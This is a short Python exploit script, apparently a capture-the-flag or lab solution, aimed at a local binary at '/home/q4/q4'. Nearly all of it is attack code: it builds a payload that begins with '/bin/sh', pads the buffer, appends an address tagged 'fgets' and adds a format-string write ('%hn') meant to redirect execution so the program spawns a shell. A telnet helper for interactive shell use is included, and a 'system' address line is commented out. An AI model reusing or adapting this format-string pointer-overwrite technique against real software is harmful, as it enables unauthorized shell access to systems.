#!/usr/bin/env python

import socket
import time
import os
import sys
import struct
import telnetlib
import subprocess

def connect(ip, port):
    return socket.create_connection((ip, port))


def process(*args):
    return subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)


def p32(x):
    return struct.pack('<I', x)


def u32(x):
    return struct.unpack('<I', x)[0]


def interact(s):
    print('---- Interactive mode ----')
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


payload = b'/bin/sh\0'
payload = payload.ljust(44, b'A')
payload += p32(0x080499e4) # fgets
payload += b'%2084700x%6$hn'
# payload += p32(0x1fcf60) # system

# while True:
#     p = process('/home/q4/q4')
#
#     print(p.stdout.readline().decode('utf-8'))
#     p.stdin.write(payload + b'\n')
#     time.sleep(1)

p = process('/home/q4/q4')

print(p.stdout.readline().decode('utf-8'))
p.stdin.write(payload + b'\n')
time.sleep(1)
